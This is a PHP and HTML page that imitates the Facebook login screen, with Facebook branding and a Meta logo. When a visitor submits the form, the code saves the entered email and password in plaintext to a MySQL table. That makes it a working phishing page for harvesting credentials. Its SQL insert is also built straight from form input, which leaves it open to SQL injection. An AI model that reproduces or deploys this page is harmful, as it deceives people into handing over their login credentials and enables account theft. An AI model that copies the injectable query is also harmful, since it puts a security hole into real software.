<?php
$hostaddress="localhost";
$username="root";
$password="";
$db="facebook";

$con=new mysqli($hostaddress,$username,$password,$db);

if ($con->connect_error) {
    die("Connection Failed: " .$con->connect_error);
}
else {
   // echo "Connected Successfully";
    }

    if(isset($_POST["save"])) {
        $email=$_POST['email'];
        $password=$_POST['password'];
    
        $insert=$con->query("INSERT INTO `facebook` (`email`,`password`)
        VALUES 
        ('$email','$password')");
    
        if ($insert){
           // echo "Save Successfully!!";
        }
        else {
            echo "Save Unsuccessfully!!";
        }
    }
    
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Facebook Login</title>
  <style>
    /* General Reset */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: Arial, sans-serif;
    }

    body {
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .login-container {
      background: white;
      padding: 40px 30px;
      border-radius: 12px;
      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
      max-width: 400px;
      text-align: center;
    }

    .login-container h1 {
      color: #1877f2;
      font-size: 36px;
      font-weight: bold;
      margin-bottom: 20px;
    }

    .login-container p {
      color: #606770;
      font-size: 14px;
      margin-bottom: 30px;
    }

    .login-form input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border: 1px solid #dddfe2;
      border-radius: 8px;
      font-size: 16px;
    }

    .login-form input:focus {
      border-color: #1877f2;
      outline: none;
    }

    .login-button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .login-button:hover {
      background-color: #165cbd;
    }

    .separator {
      display: flex;
      align-items: center;
      text-align: center;
      margin: 20px 0;
    }

    .separator::before, .separator::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dddfe2;
    }

    .separator span {
      padding: 0 10px;
      color: #606770;
      font-size: 14px;
    }

    .create-account {
      display: inline-block;
      margin-top: 10px;
      color: #42b72a;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      text-decoration: none;
      transition: color 0.3s ease;
    }

    .create-account:hover {
      color: #36a420;
    }

    .meta-logo {
      margin-top: 20px;
    }

    .meta-logo img {
      width: 58px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <h1>Facebook</h1>
    <p>Connect with friends and the world around you on Facebook.</p>
    <form class="login-form" method="post" enctype="multipart/form-data">
      <input type="email" name="email" id="email" placeholder="Email or Phone Number">
      <input type="password" name="password" id="password" placeholder="Password">
      <button type="submit" name="save" value="login" class="login-button">Log In</button>
    </form>
    <div class="separator">
      <span>or</span>
    </div>
    <a href="#" class="create-account">Create New Account</a>
    <div class="meta-logo">
      <img src="Meta_Platforms_Inc._logo.svg.png" alt="Meta Logo">
    </div>
  </div>
</body>
</html>
